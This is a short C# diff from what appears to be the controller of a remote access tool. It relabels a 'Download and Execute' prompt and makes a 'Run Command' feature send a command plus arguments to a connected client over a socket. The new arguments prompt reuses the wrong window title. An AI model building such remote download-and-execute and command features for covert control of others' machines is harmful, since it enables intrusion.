@@ -52,7 +52,7 @@
         }
         private void DownloadExecute()
         {
-            string url = TextInputWindow.ShowWindow("Download and Execute", "URL:");
+            string url = TextInputWindow.ShowWindow("Download and Execute", "URL to download:");
             if (!string.IsNullOrEmpty(url))
             {
                 DownloadExec downloadExec = new DownloadExec(url);
@@ -63,9 +63,12 @@
         private void Run()
         {
             String rcmd = TextInputWindow.ShowWindow("Run Command", "Command:");
+                        string args = TextInputWindow.ShowWindow("Download and Execute", "Arguments:");
+                        string sendstring = rcmd + "|" + args;
+
          if (!string.IsNullOrEmpty(rcmd))
             {
-                this.clientSocket.SendObject(1003, rcmd);
+                this.clientSocket.SendObject(1003, sendstring);
           
             
             }
